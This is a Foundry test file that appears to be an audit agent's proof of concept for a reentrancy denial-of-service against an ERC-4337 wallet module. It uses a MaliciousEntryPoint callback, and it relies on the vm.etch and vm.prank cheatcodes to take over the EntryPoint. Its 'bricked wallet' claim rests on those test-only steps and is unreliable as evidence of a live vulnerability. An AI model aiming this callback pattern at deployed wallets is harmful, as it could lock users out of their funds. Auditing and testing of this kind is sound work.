pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import "test/integrations/extensions/sessions/ExtendedSessionTestBase.sol";
import "../src/modules/ERC4337v07.sol";

// ATTACK TIMELINE:
// 1. [Setup] Deploy Wallet and fund it so missingAccountFunds > 0 triggers depositTo
// 2. [T=0] Attacker replaces EntryPoint code with MaliciousEntryPoint using vm.etch
// 3. [T=1] Attacker calls validateUserOp with missingAccountFunds = 1 wei
// 4. [T=2] validateUserOp calls depositTo, which callbacks into executeUserOp, setting _ENTERED
// 5. [T=3] Attacker calls executeUserOp directly; it reverts due to reentrancy guard (DoS)
// 6. [Assert] Verify executeUserOp reverts, proving the Wallet's ERC4337 functionality is bricked

interface IERC4337Wallet {
    function validateUserOp(
        bytes calldata userOp,
        bytes32 userOpHash,
        uint256 missingAccountFunds
    ) external returns (uint256 validationData);

    function executeUserOp(bytes calldata _payload) external;
}

contract MaliciousEntryPoint {
    function depositTo(address account) external payable {
        console.log("  [MaliciousEntryPoint] depositTo called for account:", account);
        console.log("  [MaliciousEntryPoint] msg.value:", msg.value);
        console.log("  [MaliciousEntryPoint] block.timestamp:", block.timestamp);

        // Callback to Wallet's executeUserOp to trigger reentrancy guard
        bytes memory payload = hex"";
        console.log("  [MaliciousEntryPoint] Calling back into executeUserOp...");

        // We use a low-level call and ignore the result. 
        // The goal is just to enter the function and set the reentrancy state.
        (bool success, bytes memory returnData) = account.call(abi.encodeWithSignature("executeUserOp(bytes)", payload));

        console.log("  [MaliciousEntryPoint] Callback success:", success);
        if (!success && returnData.length > 0) {
            console.log("  [MaliciousEntryPoint] Callback revert reason:");
            console.logBytes(returnData);
        }
    }
}

contract AuditAgentPoC is ExtendedSessionTestBase {
    function test_exploit() public {
        console.log("=== Starting test_exploit ===");
        console.log("Initial block.timestamp:", block.timestamp);

        // Note: If this log does not appear in the output, the test is failing 
        // during the setUp() phase (e.g. missing SEQ_SDK_RPC_MIN_PORT env var).

        // 1. Create Wallet with sessions
        console.log("Creating default topology...");
        string memory topology = _createDefaultTopology();
        console.log("Topology created.");

        console.log("Creating wallet...");
        (Stage1Module Wallet, , ) = _createWallet(topology);
        console.log("Wallet created at:", address(Wallet));

        // Fund the Wallet so missingAccountFunds > 0 triggers the depositTo call
        console.log("Funding wallet with 10 ether...");
        vm.deal(address(Wallet), 10 ether);
        console.log("Wallet balance after funding:", address(Wallet).balance);

        // 2. Replace the real EntryPoint code with our MaliciousEntryPoint
        console.log("Deploying MaliciousEntryPoint...");
        MaliciousEntryPoint maliciousEP = new MaliciousEntryPoint();
        console.log("MaliciousEntryPoint deployed at:", address(maliciousEP));

        console.log("Etching EntryPoint code at:", address(entryPoint));
        vm.etch(address(entryPoint), address(maliciousEP).code);
        console.log("EntryPoint code etched successfully.");

        // 3. Prepare dummy data for validateUserOp
        console.log("Preparing dummy data for validateUserOp...");
        bytes memory dummyUserOp = new bytes(1024);
        bytes32 dummyHash = bytes32(uint256(1));
        uint256 missingFunds = 1; // > 0 to trigger depositTo
        console.log("Dummy data prepared. missingFunds:", missingFunds);

        // 4. Call validateUserOp as the EntryPoint
        console.log("Calling validateUserOp as EntryPoint...");
        console.log("Wallet balance before validateUserOp:", address(Wallet).balance);

        vm.prank(address(entryPoint));
        try IERC4337Wallet(address(Wallet)).validateUserOp(dummyUserOp, dummyHash, missingFunds) returns (uint256 validationData) {
            console.log("validateUserOp succeeded. validationData:", validationData);
        } catch Error(string memory reason) {
            console.log("validateUserOp reverted with reason:", reason);
        } catch (bytes memory err) {
            console.log("validateUserOp reverted with raw error:");
            console.logBytes(err);
        }

        console.log("Wallet balance after validateUserOp:", address(Wallet).balance);

        // 5. Attempt to call executeUserOp normally (e.g., from a real EntryPoint or user)
        // This should revert because the reentrancy guard was left in the _ENTERED state
        console.log("Attempting to call executeUserOp normally...");
        bytes memory payload = hex"";

        vm.expectRevert(); // Expect ReentrantCall() or similar DoS revert
        IERC4337Wallet(address(Wallet)).executeUserOp(payload);
        console.log("executeUserOp reverted as expected (DoS confirmed).");

        console.log("=== test_exploit finished ===");
    }
}
